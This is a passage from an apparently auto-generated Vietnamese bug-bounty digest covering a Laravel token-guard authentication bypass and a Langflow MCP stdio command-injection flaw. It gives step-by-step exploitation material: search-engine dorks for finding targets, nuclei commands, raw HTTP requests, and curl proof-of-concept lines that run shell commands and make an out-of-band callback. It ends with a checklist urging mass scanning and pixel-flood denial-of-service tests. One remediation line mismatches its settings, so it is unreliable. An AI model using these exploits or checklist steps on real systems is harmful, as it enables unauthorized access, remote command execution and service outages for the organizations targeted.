# Cấu hình TokenGuard trong config/auth.php với driver = token
php artisan serve --port=8000
```

#### 🔍 4. Nhận Diện & Trinh Sát (Discovery & Fingerprinting)
- **Shodan Dork**: `Set-Cookie: laravel_session`
- **FOFA Dork**: `header="laravel_session"` || `body="laravel"`
- **Lệnh Quét Nuclei**:
  ```bash
  nuclei -t http/cves/2026/CVE-2026-114509.yaml -u https://api.target.com -v
  ```

#### ⚡ 5. Hướng Dẫn Khai Thác Từng Bước (Step-by-Step PoC Execution)

**Bước 1: Gửi request API kèm Bearer Token rỗng hoặc mảng type-juggling**:
```http
GET /api/user HTTP/1.1
Host: api.target.com
Authorization: Bearer []
Content-Type: application/json
Accept: application/json
```

**Bước 2: Câu lệnh cURL một dòng**:
```bash
curl -i -s -k "https://api.target.com/api/v1/profile" \
  -H "Authorization: Bearer " \
  -H "X-Requested-With: XMLHttpRequest"
```

**Bước 3: Dấu Hiệu Thành Công (Success Oracle)**:
- Máy chủ trả về mã phản hồi `HTTP 200 OK` (thay vì `401 Unauthorized`).
- Body phản hồi chứa thông tin nhạy cảm của người dùng:
  ```json
  {
    "id": 1,
    "name": "Administrator",
    "email": "admin@target.com",
    "role": "superadmin"
  }
  ```

#### 🛡️ 6. Biện Pháp Khắc Phục (Remediation)
- Cập nhật framework Laravel lên phiên bản mới nhất.
- Đảm bảo cơ sở dữ liệu không chứa cột `api_token` mang giá trị `NULL`.
- Luôn sử dụng hàm `hash_equals()` khi thực hiện kiểm tra token xác thực.

---

### 🔴 CVE 3: CVE-2026-105740 — Langflow Authenticated MCP Stdio Command Execution

#### 📌 1. Thông Tin Chung
| Chỉ Số | Giá Trị Chi Tiết |
| :--- | :--- |
| **CVE ID** | `CVE-2026-105740` |
| **Tên Lỗ Hổng** | Langflow MCP Stdio Client Arbitrary Command Execution |
| **Điểm CVSS** | **8.8 HIGH** (`CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H`) |
| **CWE** | `CWE-78: Improper Neutralization of Special Elements used in an OS Command` |
| **Phiên Bản Bị Ảnh Hưởng**| Langflow `1.8.3` và `1.9.0` |
| **Môi Trường Ảnh Hưởng** | Các hệ thống AI Workflow Builder, Langflow self-hosted |
| **Tình Trạng Vũ Khí Hóa**| **Đã có Nuclei Template** (`http/cves/2026/CVE-2026-105740.yaml`) |

#### 🎯 2. Cơ Chế & Nguyên Nhân Gốc Rễ (Root Cause)
Langflow cung cấp tính năng kết nối đến các công cụ MCP (Model Context Protocol) thông qua giao thức `stdio`. Khi cấu hình một custom MCP component, tham số `command` và `args` được truyền trực tiếp vào tiến trình `subprocess.Popen(..., shell=True)` trên máy chủ mà không có cơ chế whitelisting. Người dùng có quyền truy cập giao diện Langflow (kể cả quyền tài khoản tạo miễn phí nếu bật open-registration) có thể cấu hình component độc hại để thực thi lệnh hệ điều hành máy chủ.

#### 🧪 3. Môi Trường Thử Nghiệm An Toàn (Lab Setup)
Khởi chạy Langflow phiên bản `1.8.3` bằng Docker:
```bash
docker run -d --name langflow-lab -p 7860:7860 logspace/langflow:1.8.3
```

#### 🔍 4. Nhận Diện & Trinh Sát (Discovery & Fingerprinting)
- **Shodan Dork**: `title:"Langflow"` hoặc `http.html:"Langflow"`
- **FOFA Dork**: `app="Langflow"` || `title="Langflow"`
- **Nuclei Command**:
  ```bash
  nuclei -t http/cves/2026/CVE-2026-105740.yaml -u http://ai-server.target.local:7860
  ```

#### ⚡ 5. Hướng Dẫn Khai Thác Từng Bước (Step-by-Step PoC Execution)

**Bước 1: Gửi Request tạo/thực thi MCP Tool Component chứa Command**:
```http
POST /api/v1/custom_component HTTP/1.1
Host: ai-server.target.local:7860
Authorization: Bearer <user_jwt_token>
Content-Type: application/json

{
  "name": "MCP Exploit",
  "mcp_config": {
    "type": "stdio",
    "command": "sh",
    "args": ["-c", "id; whoami > /tmp/pwned.txt"]
  }
}
```

**Bước 2: Câu lệnh cURL PoC kiểm tra OOB Callback**:
```bash
curl -X POST "http://ai-server.target.local:7860/api/v1/custom_component" \
  -H "Authorization: Bearer YOUR_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"mcp_config": {"type": "stdio", "command": "curl", "args": ["http://BURP_COLLABORATOR_URL"]}}'
```

**Bước 3: Dấu Hiệu Thành Công (Success Oracle)**:
- Máy chủ gửi kết nối DNS/HTTP callback về Burp Collaborator / Interactsh.
- Hoặc response trả về output của lệnh `id` / `whoami` (`uid=0(root) gid=0(root)`).

#### 🛡️ 6. Biện Pháp Khắc Phục (Remediation)
- Cập nhật Langflow lên phiên bản `>= 1.9.1`.
- Vô hiệu hóa chế độ Open Registration trong file `.env` (`LANGFLOW_AUTO_SAVING=false`, `LANGFLOW_DISABLE_CUSTOM_COMPONENTS=true`).
- Cô lập tiến trình Langflow trong Docker container không cấp quyền root (`read-only root filesystem`).

---

## 📋 6. BUG HUNTER ACTION CHECKLIST HÔM NAY

Dưới đây là các hành động chiến lược mà bạn có thể bắt tay vào kiểm thử ngay trên các mục tiêu Bug Bounty hôm nay:

- [ ] **1. Quét Craft CMS với CVE-2026-123488**:
  - Dùng Shodan/FOFA lọc các target thuộc scope có tiêu đề `Craft CMS`.
  - Chạy `nuclei -t http/cves/2026/CVE-2026-123488.yaml -l targets_craftcms.txt`.
  - Đây là lỗi SQLi Unauthenticated mức Critical, khả năng đạt $3,000 - $10,000 bounty rất cao.
- [ ] **2. Rà Soát Các API Endpoint Laravel với CVE-2026-114509**:
  - Tìm các ứng dụng sử dụng Laravel qua cookie `laravel_session`.
  - Gửi thử request với `Authorization: Bearer ` hoặc mảng rỗng trên các endpoint `/api/user`, `/api/profile`.
- [ ] **3. Thử Nghiệm Pixel Flood Attack trên Mục Tiêu Mới**:
  - Tải lên ảnh pixel flood kích thước 50,000 x 50,000 pixel dung lượng 20KB lên các chức năng upload avatar, logo công ty.
  - Theo dõi xem server có phản hồi chậm hoặc trả về `502 Bad Gateway` / `504 Gateway Timeout` hay không.
- [ ] **4. Khảo Sát Hệ Thống AI Nội Bộ & AI Portals**:
  - Kiểm tra xem công ty mục tiêu có triển khai Langflow, MLflow hoặc vLLM public ra ngoài không bằng Dork Shodan `app="Langflow"`.

---
*Báo cáo được khởi tạo tự động bởi **Antigravity Daily Security Digest Skill**.*
*Mọi dữ liệu phục vụ mục đích nghiên cứu phòng thủ và kiểm thử thâm nhập có thẩm quyền.*
